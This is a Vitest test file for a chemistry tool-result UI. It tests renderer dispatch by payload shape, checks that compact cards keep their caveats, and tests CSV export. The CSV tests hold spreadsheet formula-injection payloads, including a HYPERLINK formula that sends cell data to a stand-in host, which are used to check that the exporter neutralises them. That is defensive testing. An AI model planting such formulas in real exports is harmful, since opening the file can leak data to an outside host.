/**
 * Which renderer draws a result, and what a compact one is allowed to leave out.
 *
 * The dispatch is keyed on the payload's **shape** wherever a shape exists to key on, and that is
 * the property worth pinning: the service registers ~56 tools and grows, so a name-keyed table
 * means every new tool is invisible until somebody writes an entry for it. These tests hand the
 * registry payloads under tool names it has never heard of, and expect the right renderer anyway.
 *
 * The second group is the one that protects a reader rather than a developer. A compact card may
 * show fewer rows; it may never drop the sentence that decides how the rows are read. An empty
 * hazard table is not a clearance, an empty hit list can mean the index is empty, and a compact
 * view that trims those to save two lines is a card that says something the full view does not.
 */

import { afterEach, describe, expect, it, vi } from 'vitest';
import { cleanup, render, screen } from '@testing-library/react';
import { rendererFor, toCsv } from '../src/results/renderers.tsx';
import type { Json } from '../src/results/shape.ts';

vi.mock('../src/auth/AuthContext.tsx', () => ({
  useAuth: () => ({ auth: { getAccessToken: async () => null, mode: 'dev' }, ready: true }),
}));

afterEach(cleanup);

const pick = (tool: string, payload: unknown): { id: string; wide: boolean; data: Json } => {
  const found = rendererFor(tool, payload);
  if (!found) throw new Error('no renderer');
  return { id: found.renderer.id, wide: found.renderer.wide, data: found.data };
};

const draw = (tool: string, payload: unknown, compact: boolean): void => {
  const found = rendererFor(tool, payload);
  if (!found) throw new Error('no renderer');
  const { renderer, data } = found;
  render(<renderer.View data={data} tool={tool} compact={compact} onUsed={() => {}} />);
};

describe('dispatch', () => {
  it('finds the hazard table by its flags, under a tool name it has never seen', () => {
    expect(pick('screen_something_new', { flags: [], screened: ['CCO'] }).id).toBe('hazard');
  });

  it('finds a fingerprint search by its hits carrying structures', () => {
    expect(pick('similar_reactions', { hits: [{ label: 'CCO>>CC=O', similarity: 0.8 }] }).id).toBe(
      'structures',
    );
  });

  it('does not claim a hits list of something that is not a structure', () => {
    // A job listing has hits too. Claiming it would draw a grid of failed depictions where a
    // table belongs.
    expect(pick('find_past_jobs', { hits: [{ job_id: 'calc-1', kind: 'calc' }] }).id).toBe('table');
  });

  it('reads an empty fingerprint result only when it carries the search’s own flags', () => {
    // The empty hit list is the dangerous one — "the index is empty" and "no analogue exists"
    // arrive identically — so it is only claimed when `index_empty` says which search this was.
    expect(pick('similar_molecules', { hits: [], index_empty: true }).id).toBe('structures');
    expect(rendererFor('anything', { hits: [] })).toBeNull();
  });

  it('finds a series by a run of numbers, and names it by the key the service chose', () => {
    const picked = pick('campaign_progress', { running_best: [41, 52, 58, 63, 71] });
    expect(picked.id).toBe('series');
  });

  it('finds a value strip only when there is no record list to tabulate', () => {
    expect(pick('predict_pka', { pka: 4.76, sd: 1.6 }).id).toBe('values');
    // A payload with both is a table with a header, not a strip.
    expect(pick('predict_pka', { pka: 4.76, sites: [{ atom: 3, pka: 4.76 }] }).id).toBe('table');
  });

  it('wraps a bare top-level list so every renderer can assume an object', () => {
    const picked = pick('find_notes', [{ id: 'note-1' }, { id: 'note-2' }]);
    expect(picked.id).toBe('table');
    expect(picked.data).toEqual({ items: [{ id: 'note-1' }, { id: 'note-2' }] });
  });

  it('has nothing to say about a payload with no structure in it', () => {
    expect(rendererFor('anything', { note: 'a sentence' })).toBeNull();
    expect(rendererFor('anything', 'just text')).toBeNull();
  });

  it('reads a screening design as a run sheet, in the order it was given', () => {
    // The order IS the data — a design randomises its run order deliberately — so the rows are
    // numbered as they arrive rather than invited to be sorted.
    const picked = pick('generate_screening_design', {
      runs: [
        { temperature: 40, equivalents: 1.1 },
        { temperature: 80, equivalents: 1.1 },
      ],
    });
    expect(picked.id).toBe('runsheet');
  });

  it('summarises a payload with what it says, never with a judgement', () => {
    const hazard = rendererFor('screen_hazards', {
      flags: [{ severity: 'high' }, { severity: 'low' }],
    });
    expect(hazard?.renderer.summary?.(hazard.data)).toEqual({ text: '2 · high', tone: 'danger' });

    // "no rule matched", never "clear": the difference between them is the whole of the caveat
    // the renderer pins above the table.
    const clean = rendererFor('screen_hazards', { flags: [] });
    expect(clean?.renderer.summary?.(clean.data)?.text).toBe('no rule matched');
  });

  it('asks for the card’s full width only where a table or a grid needs it', () => {
    expect(pick('screen_hazards', { flags: [] }).wide).toBe(true);
    expect(pick('predict_pka', { pka: 4.76 }).wide).toBe(false);
  });
});

describe('a compact card keeps every sentence that qualifies the data', () => {
  it('keeps the hazard caveat when it drops rows', () => {
    const flags = Array.from({ length: 6 }, (_, i) => ({
      rule_id: `rule-${i}`,
      severity: 'high',
      explanation: 'why',
      citation: 'somewhere',
      matched: 'CCO',
    }));
    draw('screen_hazards', { flags }, true);

    // Matched on a contiguous clause: the sentence contains a <strong>, so a regex spanning it
    // would fail on the markup rather than on the meaning.
    expect(screen.getByText(/rules cover known motifs/i)).toBeTruthy();
    // Said out loud rather than left to the reader to notice, so a card can never be mistaken for
    // the whole result.
    expect(screen.getByText(/3 of 6 shown/)).toBeTruthy();
  });

  it('keeps the empty-index banner, which is the reading rather than the data', () => {
    draw('similar_molecules', { hits: [], index_empty: true, subject: 'compound' }, true);
    expect(screen.getByText(/was not answered/i)).toBeTruthy();
  });

  it('keeps the unresolved-species alert on a charge table', () => {
    draw(
      'stoichiometry_table',
      {
        basis_name: 'aryl bromide',
        basis_mass_g: 10,
        unresolved: ['the ligand we call L7'],
        rows: [{ name: 'aryl bromide', role: 'basis', mass_g: 10 }],
      },
      true,
    );
    expect(screen.getByText(/the ligand we call L7/)).toBeTruthy();
  });
});

describe('the CSV a chemist opens in Excel', () => {
  it('quotes by RFC 4180 and doubles an embedded quote', () => {
    expect(toCsv(['name', 'note'], [{ name: 'THF, dry', note: 'he said "no"' }])).toBe(
      'name,note\r\n"THF, dry","he said ""no"""',
    );
  });

  it('neutralises a cell a spreadsheet would run as a formula', () => {
    // Excel, LibreOffice and Sheets all evaluate a cell beginning `=`, `+` or `@`. Every string in
    // these tables came from outside the browser — a solvent name the corpus was asked about, a
    // reagent on a run sheet — and the payload is a tool result, not a constant. The classic form
    // is `=HYPERLINK("http://…"&A1)`, which runs when the chemist opens the file rather than when
    // anyone reviews it. Quoting does not help: `"=cmd|…"` evaluates identically.
    const csv = toCsv(
      ['name'],
      [{ name: '=HYPERLINK("http://x/"&A1)' }, { name: '+1' }, { name: '@SUM(A1)' }],
    );
    for (const line of csv.split('\r\n').slice(1)) {
      expect(line.replace(/^"/, '').startsWith("'")).toBe(true);
    }
  });

  it('leaves a negative number alone, because every table here has some', () => {
    // The prefix is a real cost — it changes the value a spreadsheet reads — so it is spent only
    // where there is a formula to stop. `-40` is a temperature.
    expect(toCsv(['t'], [{ t: -40 }])).toBe('t\r\n-40');
    // A leading `-` in front of something that is not a number is a different matter.
    expect(toCsv(['t'], [{ t: '-1+1e1*A1' }])).toBe("t\r\n'-1+1e1*A1");
  });
});
